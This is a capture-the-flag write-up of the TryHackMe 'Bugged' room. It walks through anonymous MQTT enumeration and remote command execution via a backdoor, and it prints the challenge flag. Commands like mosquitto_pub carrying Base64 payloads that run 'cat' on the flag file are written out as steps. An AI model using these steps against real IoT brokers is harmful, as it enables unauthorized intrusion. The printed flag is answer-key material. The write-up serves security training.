# Bugged

### Challenge Link: https://tryhackme.com/room/bugged

## Overview

**Platform:** TryHackMe
**Room:** Bugged
**Category:** IoT Security / Network Enumeration / MQTT
**Difficulty:** Easy

### Challenge Description

John noticed unusual network traffic while working on his smart-home appliances. The objective is to investigate the suspicious communications, identify the exposed service, analyze its messages, and retrieve the flag.

## Tools Used

* **Nmap** — Port scanning and service enumeration
* **Mosquitto Clients** — MQTT subscription and message publishing
* **Base64** — Decoding encoded messages
* **Kali Linux** — Testing environment

## Walkthrough

### 1. Port Scanning with Nmap

Started by scanning all TCP ports on the target machine to identify exposed services.

```bash
nmap -sV -p- 10.48.149.138 -vvv
```

**Discovered services:**

| Port     | Service | Version          |
| -------- | ------- | ---------------- |
| 22/tcp   | SSH     | OpenSSH 8.2p1    |
| 1883/tcp | MQTT    | Mosquitto 2.0.14 |

Port `1883` was particularly interesting because MQTT is commonly used for communication between IoT and smart-home devices.

### 2. Enumerating MQTT Topics

Subscribed to all available MQTT topics to observe device communications.

```bash
mosquitto_sub -h 10.48.149.138 -p 1883 -t '#' -v
```

The broker allowed the client to subscribe without authentication.

Messages from several smart-home devices appeared, including:

* `storage/thermostat`
* `patio/lights`
* `livingroom/speaker`
* `kitchen/toaster`
* `frontdeck/camera`

An unusual configuration topic also appeared:

```text
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config
```

Its payload contained Base64-encoded JSON.

### 3. Decoding the Configuration

Copied the encoded payload and decoded it using:

```bash
echo 'BASE64_PAYLOAD' | base64 -d
```

The decoded configuration revealed the following information:

```json
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "registered_commands": [
    "HELP",
    "CMD",
    "SYS"
  ],
  "pub_topic": "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub",
  "sub_topic": "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
}
```

The configuration exposed a backdoor interface with three registered commands.

| Command | Purpose                    |
| ------- | -------------------------- |
| `HELP`  | Display available commands |
| `CMD`   | Execute a shell command    |
| `SYS`   | Return system information  |

### 4. Listening for Backdoor Responses

Subscribed to the response topic:

```bash
mosquitto_sub -h 10.48.149.138 -p 1883 \
-t 'U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub' -v
```

This terminal was kept open to receive responses from the backdoor.

### 5. Sending Commands Through MQTT

The backdoor expected a Base64-encoded JSON message containing an ID, command, and argument.

Example message structure:

```json
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "cmd": "HELP",
  "arg": ""
}
```

Generated the encoded payload using:

```bash
echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"HELP","arg":""}' | base64 -w0
```

Published the message to the backdoor's subscription topic:

```bash
payload=$(echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"HELP","arg":""}' | base64 -w0)

mosquitto_pub -h 10.48.149.138 -p 1883 \
-t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' \
-m "$payload"
```

The backdoor returned its supported commands and the required message format.

### 6. Identifying the Target System

Sent the `SYS` command to obtain system information.

```bash
payload=$(echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"SYS","arg":""}' | base64 -w0)

mosquitto_pub -h 10.48.149.138 -p 1883 \
-t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' \
-m "$payload"
```

The response identified the operating system as:

```text
Linux x64 5.15.0-139-generic
```

### 7. Enumerating Files and Retrieving the Flag

Used the `CMD` command to inspect the execution context and list files:

```bash
payload=$(echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"id; pwd; ls -la"}' | base64 -w0)

mosquitto_pub -h 10.48.149.138 -p 1883 \
-t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' \
-m "$payload"
```

The response showed that the command executed as the `challenge` user in `/home/challenge`. The directory listing revealed a `flag.txt` file owned by root.

Requested the file contents through the backdoor:

```bash
payload=$(echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"cat /home/challenge/flag.txt"}' | base64 -w0)

mosquitto_pub -h 10.48.149.138 -p 1883 \
-t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' \
-m "$payload"
```

The MQTT response returned the flag.

## Flag

```text
flag{18d44fc0707ac8dc8be45bb83db54013}
```

## Key Takeaways

* Identified exposed services using Nmap.
* Enumerated MQTT topics using Mosquitto clients.
* Recognized the security risks of anonymous MQTT access.
* Decoded Base64-encoded JSON messages.
* Investigated a hidden MQTT backdoor and its command interface.
* Used MQTT messages to execute commands and retrieve a challenge flag.

## Security Lessons

1. Require authentication on MQTT brokers.
2. Enforce topic-level access control using MQTT ACLs.
3. Avoid exposing administrative or shell-execution interfaces through IoT messaging.
4. Validate commands and restrict execution privileges.
5. Monitor unusual MQTT topics, unauthorized subscriptions, and unexpected command traffic.

## Disclaimer

This write-up documents activity performed against the authorized TryHackMe training environment. These techniques should only be used in systems you own or have explicit permission to test.